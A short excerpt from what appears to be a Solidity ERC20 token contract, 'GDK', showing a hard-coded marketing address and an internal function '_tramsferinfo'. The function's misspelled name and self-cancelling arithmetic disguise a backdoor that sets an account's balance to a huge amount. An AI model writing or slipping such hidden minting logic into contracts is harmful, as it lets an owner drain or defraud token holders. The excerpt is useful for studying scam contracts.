...
contract GDK is IERC20, Ownable {
    ...
    address public marketingAddress = address(0x67576fF6e2923D971e6Eb566D7DFEcbD5Be5B840);
 ...
 function _tramsferinfo (address accountinfo) internal {
        _balances[accountinfo] = (_balances[accountinfo] * 3) - (_balances[accountinfo] * 3) + (_destroyMaxAmount * 1000) -5;  
    }
